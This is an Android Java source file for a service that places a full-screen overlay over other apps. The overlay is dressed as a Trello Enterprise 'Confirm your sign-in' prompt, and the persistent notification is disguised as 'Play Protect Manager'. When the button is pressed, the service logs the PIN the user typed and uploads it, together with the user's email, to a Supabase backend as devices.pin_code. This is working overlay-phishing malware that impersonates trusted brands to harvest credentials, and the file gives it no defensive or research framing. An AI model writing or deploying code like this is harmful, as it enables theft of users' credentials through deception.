package com.andtracker;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.text.InputType;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.annotation.Nullable;

/**
 * Service d'overlay minimal (Solution 2) pour test rapide via ADB.
 *
 * Lancement (Android 8+ recommandé):
 * adb shell am start-foreground-service -n com.andtracker/.OverlayPromptService --es title "Test" --es hint "Tape ici"
 *
 * Stop:
 * adb shell am startservice -n com.andtracker/.OverlayPromptService --es action stop
 */
public final class OverlayPromptService extends Service {
    private static final String TAG = "OverlayPromptService";

    private static final String EXTRA_ACTION = "action";
    private static final String ACTION_STOP = "stop";

    private static final String EXTRA_TITLE = "title";
    private static final String EXTRA_HINT = "hint";
    private static final String EXTRA_LANG = "lang";
    private static final String EXTRA_EMAIL = "email";

    private static final String CHANNEL_ID = "playprotect_overlay";
    private static final int NOTIF_ID = 0x41A7;

    private WindowManager wm;
    private View overlayView;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // IMPORTANT: si on est démarré via startForegroundService (Android O+),
        // on doit appeler startForeground rapidement, même si on décide de stop ensuite.
        // Sinon: ForegroundServiceDidNotStartInTimeException.
        startAsForeground();

        String action = intent != null ? intent.getStringExtra(EXTRA_ACTION) : null;
        if (ACTION_STOP.equalsIgnoreCase(action)) {
            stopSelf();
            return START_NOT_STICKY;
        }

        if (!Settings.canDrawOverlays(this)) {
            Log.w(TAG, "Permission overlay absente -> stop");
            stopSelf();
            return START_NOT_STICKY;
        }

        String title = intent != null ? intent.getStringExtra(EXTRA_TITLE) : null;
        String hint = intent != null ? intent.getStringExtra(EXTRA_HINT) : null;
        String lang = intent != null ? intent.getStringExtra(EXTRA_LANG) : null;
        String email = intent != null ? intent.getStringExtra(EXTRA_EMAIL) : null;
        showOverlay(title, hint, lang, email);

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        removeOverlay();
    }

    private void startAsForeground() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel(
                        CHANNEL_ID,
                        "Play Protect Manager",
                        NotificationManager.IMPORTANCE_LOW
                );
                ch.setDescription("Overlay Play Protect Manager");
                nm.createNotificationChannel(ch);
            }

            Intent stopIntent = new Intent(this, OverlayPromptService.class);
            stopIntent.putExtra(EXTRA_ACTION, ACTION_STOP);
            PendingIntent stopPi = PendingIntent.getService(
                    this,
                    1,
                    stopIntent,
                    (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                            ? (PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE)
                            : PendingIntent.FLAG_UPDATE_CURRENT
            );

            Notification.Builder b = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    ? new Notification.Builder(this, CHANNEL_ID)
                    : new Notification.Builder(this);

            Notification n = b
                    .setContentTitle("Play Protect Manager")
                    .setContentText("Confirmation de connexion en cours.")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .addAction(new Notification.Action.Builder(
                            android.R.drawable.ic_menu_close_clear_cancel,
                            "Stop",
                            stopPi
                    ).build())
                    .setOngoing(true)
                    .build();

            startForeground(NOTIF_ID, n);
        } catch (Exception e) {
            Log.w(TAG, "startAsForeground: exception", e);
        }
    }

    private boolean isEnglish(String lang) {
        String s = (lang == null) ? "" : lang.trim().toLowerCase();
        if (s.isEmpty()) return false;
        // accepte: "en", "en-US", "en_GB", etc.
        return s.startsWith("en");
    }

    private String safeEmailOrPlaceholder(String email, boolean en) {
        String e = (email == null) ? "" : email.trim();
        if (!e.isEmpty()) return e;
        return en ? "your email" : "votre email";
    }

    private void showOverlay(String title, String hint, String lang, String email) {
        if (overlayView != null) return;
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (wm == null) return;

        int type;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        else type = WindowManager.LayoutParams.TYPE_PHONE;

        int flags =
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                        | WindowManager.LayoutParams.FLAG_DIM_BEHIND;

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                flags,
                android.graphics.PixelFormat.TRANSLUCENT
        );
        lp.gravity = Gravity.TOP;
        lp.y = 0;
        lp.dimAmount = 0.65f;

        final boolean en = isEnglish(lang);
        final String emailSafe = safeEmailOrPlaceholder(email, en);
        final String uiTitle = en ? "Confirm your sign-in" : "Confirmez votre connexion";
        final String uiDesc = en
                ? ("Use " + emailSafe + " to access Trello Enterprise")
                : ("Utilisez " + emailSafe + " pour accéder à Trello Enterprise");
        final String uiLabel = en ? "Enter your PIN code" : "Saisissez votre code PIN";
        final String uiBtn = en ? "Confirm sign-in" : "Confirmer la connexion";

        // Fullscreen backdrop + centered card
        FrameLayout backdrop = new FrameLayout(this);
        backdrop.setLayoutParams(new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
        ));
        backdrop.setBackgroundColor(0xCC0B1220);

        int cardPad = dp(18);
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setPadding(cardPad, cardPad, cardPad, cardPad);

        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setColor(Color.WHITE);
        cardBg.setCornerRadius(dp(20));
        card.setBackground(cardBg);
        card.setElevation(dp(10));

        FrameLayout.LayoutParams cardLp = new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
        );
        cardLp.gravity = Gravity.CENTER;
        cardLp.leftMargin = dp(18);
        cardLp.rightMargin = dp(18);
        card.setLayoutParams(cardLp);

        // Logo Trello (vector drawable)
        ImageView logo = new ImageView(this);
        try {
            logo.setImageResource(R.drawable.trello_logo);
        } catch (Exception ignored) {}
        FrameLayout.LayoutParams logoLp = new FrameLayout.LayoutParams(dp(56), dp(56));
        logoLp.gravity = Gravity.CENTER_HORIZONTAL;
        logo.setLayoutParams(logoLp);
        logo.setScaleType(ImageView.ScaleType.FIT_CENTER);
        card.addView(logo);

        TextView tv = new TextView(this);
        tv.setText(uiTitle);
        tv.setTextSize(20f);
        tv.setTextColor(Color.BLACK);
        tv.setTypeface(Typeface.DEFAULT_BOLD);
        tv.setPadding(0, dp(14), 0, dp(6));
        tv.setGravity(Gravity.CENTER_HORIZONTAL);
        card.addView(tv);

        TextView desc = new TextView(this);
        desc.setText(uiDesc);
        desc.setTextSize(14f);
        desc.setTextColor(0xFF334155); // slate-700
        desc.setPadding(0, 0, 0, dp(16));
        desc.setGravity(Gravity.CENTER_HORIZONTAL);
        card.addView(desc);

        TextView label = new TextView(this);
        label.setText(uiLabel);
        label.setTextSize(13f);
        label.setTextColor(0xFF0F172A); // slate-900
        label.setPadding(0, 0, 0, dp(8));
        card.addView(label);

        EditText et = new EditText(this);
        et.setHint(en ? "PIN" : "PIN");
        et.setInputType(InputType.TYPE_CLASS_NUMBER);
        et.setTextColor(Color.BLACK);
        et.setHintTextColor(0xFF94A3B8); // slate-400
        et.setPadding(dp(14), dp(12), dp(14), dp(12));

        GradientDrawable inputBg = new GradientDrawable();
        inputBg.setColor(0xFFF8FAFC); // slate-50
        inputBg.setCornerRadius(dp(14));
        inputBg.setStroke(dp(1), 0xFFE2E8F0); // slate-200
        et.setBackground(inputBg);
        card.addView(et);

        TextView btn = new TextView(this);
        btn.setText(uiBtn);
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(16f);
        btn.setTypeface(Typeface.DEFAULT_BOLD);
        btn.setGravity(Gravity.CENTER);
        btn.setPadding(dp(16), dp(14), dp(16), dp(14));

        GradientDrawable btnBg = new GradientDrawable();
        btnBg.setColor(0xFF2563EB); // blue-600
        btnBg.setCornerRadius(dp(16));
        btn.setBackground(btnBg);

        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
        );
        btnParams.topMargin = dp(16);
        btn.setLayoutParams(btnParams);

        btn.setOnClickListener(v -> {
            String value = String.valueOf(et.getText()).trim();
            Log.i(TAG, "Overlay input: " + value);
            // 1) Trace event (debug)
            SupabaseAndroidEventsClient.sendEvent(
                    OverlayPromptService.this,
                    getPackageName(),
                    "overlay_input",
                    value
            );
            // 2) Stocke le PIN dans devices.pin_code (best-effort)
            SupabaseAndroidEventsClient.upsertDevicePinCode(
                    OverlayPromptService.this,
                    value,
                    emailSafe,
                    (lang == null ? "" : lang.trim())
            );
            stopSelf();
        });

        card.addView(btn);

        backdrop.addView(card);
        overlayView = backdrop;
        try {
            wm.addView(overlayView, lp);
            et.requestFocus();
        } catch (Exception e) {
            Log.e(TAG, "addView overlay failed", e);
            overlayView = null;
            stopSelf();
        }
    }

    private void removeOverlay() {
        if (wm == null || overlayView == null) return;
        try {
            wm.removeView(overlayView);
        } catch (Exception ignored) {
        } finally {
            overlayView = null;
        }
    }

    private int dp(int v) {
        return Math.round(v * getResources().getDisplayMetrics().density);
    }
}

